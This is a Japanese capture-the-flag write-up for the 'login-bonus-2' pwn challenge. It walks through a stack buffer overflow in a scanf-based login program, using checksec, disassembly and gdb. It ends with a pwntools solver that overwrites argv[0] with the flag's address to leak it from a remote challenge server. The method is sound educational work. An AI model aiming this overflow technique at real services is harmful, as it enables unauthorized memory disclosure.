# login-bonus-2

## 問題

パスワードを当てられますか？
```c
#include <stdio.h>
#include <string.h>

#define debug_report(progname, fmt, ...) printf("%s: " fmt "\n", progname, ##__VA_ARGS__)

char g_flag[100];

int main(int argc, char **argv) {
  /* Input password */
  char password[100];
  printf("Password: ");
  scanf("%[^\n]", password);

  /* Check password */
  if (strcmp(password, g_flag)) {
    debug_report(argv[0], "Auth NG");
    debug_report(argv[0], "Invalid password: %s", password);

  } else {
    debug_report(argv[0], "Auth OK");
    debug_report(argv[0], "FLAG: %s", g_flag);
  }
  
  return 0;
}

__attribute__((constructor))
void setup() {
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);

  /* Read the flag into `g_flag` */
  FILE *fp = fopen("/flag.txt", "r");
  if (!fp) {
    strcpy(g_flag, "FLAG{dummy}");
  } else {
    fread(g_flag, 1, sizeof(g_flag), fp);
    fclose(fp);
    /* Remove newline */
    g_flag[strcspn(g_flag, "\n")] = '\0';
  }
}
```

## 概要

実行開始時に/flag.txtから読み込んだフラグをグローバル変数`g_flag`に書き込んでいます。

その後、`password`の入力を受け付け、`g_flag`と等しくない場合はその`password`が、等しい場合は`g_flag`がそれぞれマクロ関数の`debug_report`によって出力されるようです。

`g_flag`の内容は全く推測できませんがどうしたらフラグを得られるのでしょうか？

## 解法

### 案１：何らかの方法で`g_flag`を破壊し`password`と合わせる

これがダメなのはすぐにわかりました。

過去問の`login-bodus`では、ランダムなパスワード`secret`を破壊し`password`に合わせて認証を突破しました。

しかし、今回の問題では`g_flag`を何らかの方法で破壊して強引に認証を突破したところで、表示されるのはその破壊された`g_flag`です。

これではフラグはわかりません。

よって、認証のif文条件を突破してelse部に入るのは無理そうです。

### 案２：main関数の戻り先をelse部の中に向ける

これもダメでした。

認証失敗のメッセージ表示後、スタック破壊検知によって落ちてしまいます。

どうやら今回のバイナリはコンパイル時に-fno-stack-protectorが付けられておらずStack Canaryが有効になっているようです。
```sh
$ checksec --file=login
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATHSymbols          FORTIFY Fortified       Fortifiable     FILE
Full RELRO      Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   72 Symbols   No    0               2               login
```

### 案３：`argv[0]`の方を利用する

マクロ関数の解釈を悪用できないか考えましたが、我々挑戦者がいじれるところはなさそうです。

それよりも、メッセージやフラグ等と一種に出力される`argv[0]`が気になります。

`argv`は`char **argv`で宣言されているように、char型のポインタを指すポインタです。
```
char** argv → char* arv[0] → char argv[0][0]
           指す           指す
```
この`argv[0]`を`g_flag`のアドレスに書き換えてしまえば、`debug_report(argv[0], ... )`が騙されてフラグを吐いてくれるのではないかと考えました。

まず、g_flagのアドレスを調べます。（No PIEなので固定なはずです。）
```sh
$ nm login | grep g_flag
0000000000404040 B g_flag
```

あとは、`password[0]`を基準に`argv[0]`がどこにあるのかがわかれば勝利に近づきますが、例によってデバッグシンボルが無いようなので、アセンブリを読んでみます。

```
00000000004011a6 <main>:
  4011a6:	55                   	push   %rbp
  4011a7:	48 89 e5             	mov    %rsp,%rbp
  4011aa:	48 83 c4 80          	add    $0xffffffffffffff80,%rsp
```
から、mainのローカルサイズが0x80(=128)であることがわかります。（0xffffffffffffff80を足すのは0x80を引くのと同じ。）

次に、３つ目のprintfの直前部分
```
  401217:	48 8b 45 80          	mov    -0x80(%rbp),%rax
  40121b:	48 8b 00             	mov    (%rax),%rax
  40121e:	48 8d 55 90          	lea    -0x70(%rbp),%rdx
  401222:	48 89 c6             	mov    %rax,%rsi
  401225:	bf 22 20 40 00       	mov    $0x402022,%edi
  40122a:	b8 00 00 00 00       	mov    $0x0,%eax
  40122f:	e8 3c fe ff ff       	call   401070 <printf@plt>
```
から、`password`は`rbp-0x70(=112)`の位置に、`argv`は`rbp-0x80(=128)`の位置にあることがわかります。

つまりこんな感じでしょうか？
```
↑高アドレス
----------------------
戻り先アドレス(8)
----------------------
退避ベースポインタ(8)
---------------------- rbp ←ベースポインタ
スタック破壊検知(8)
----------------------
？？？ (4)
----------------------
password[99]～[0] (100)
---------------------- rbp-112
？？？ (8)
----------------------
argv (8)
---------------------- rbp-128 ←スタックポインタ
↓低アドレス
```

`argv[0]`はどこにあるかわからないので、gdbで実行しながら調べます。

strcmpのところにブレイクポイントを設定して実行し、パスワードに`ABCDE`と入力してみます。
```sh
$ gdb login
(gdb) b *0x4011f5
Breakpoint 1 at 0x4011f5
(gdb) run
Password: ABCDE

Breakpoint 1, 0x00000000004011f5 in main ()
```
ここで、スタックの内容をスタックポインタ側から32バイト分抽出してみます。
```sh
(gdb) x/32bx $rsp
0x7fffffffdd20: 0xc8    0xde    0xff    0xff    0xff    0x7f    0x00    0x00
0x7fffffffdd28: 0x57    0x20    0x40    0x00    0x01    0x00    0x00    0x00
0x7fffffffdd30: 0x41    0x42    0x43    0x44    0x45    0x00    0x00    0x00
0x7fffffffdd38: 0x52    0x1e    0xc9    0xf7    0xff    0x7f    0x00    0x00
```
まあ、想定通りといったところでしょうか。

ここで、`0x7fffffffdd20`のところにある`0x7fffffffdec8`が`argv`の値すなわち`argv[0]`が配置されている場所であり、`0x7fffffffdd30`が`password`の場所になります。

よって、`password[0]`から見た`argv[0]`の相対位置は、
```
0x7fffffffdec8 - 0x7fffffffdd30 = 0x198 = 408
```
となります。

以上より、`password[408]`の位置に`0x0000000000404040`を書き込めばいいことがわかったので、ソルバーを作成します。

```py
import pwn

HOST, PORT = "34.170.146.252", 19608
p = pwn.remote(HOST, PORT)

payload = b'A' * 408 + pwn.p64(0x404040)
p.sendlineafter(b'Password:', payload)
print(p.recvall(timeout=10).decode())
```
```
[x] Opening connection to 34.170.146.252 on port 19608
[x] Opening connection to 34.170.146.252 on port 19608: Trying 34.170.146.252
[+] Opening connection to 34.170.146.252 on port 19608: Done
[x] Receiving all data
[x] Receiving all data: 1B
[x] Receiving all data: 583B
[+] Receiving all data: Done (583B)
[*] Closed connection to 34.170.146.252 port 19608
 Alpaca{****************************************}: Auth NG
Alpaca{****************************************}: Invalid password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@@@
*** stack smashing detected ***: terminated
```
狙いどおり、実行時のコマンド`/home/pwn/login`の代わりにフラグが姿を現しました。

## まとめ

今回の問題は、スタックカナリアが有効でもその先の破壊は可能だよ、というお話でした。

破壊検知があるから安心、ではなく、基本的なBOF対策などをしっかりと実装しなければいけないということですね。
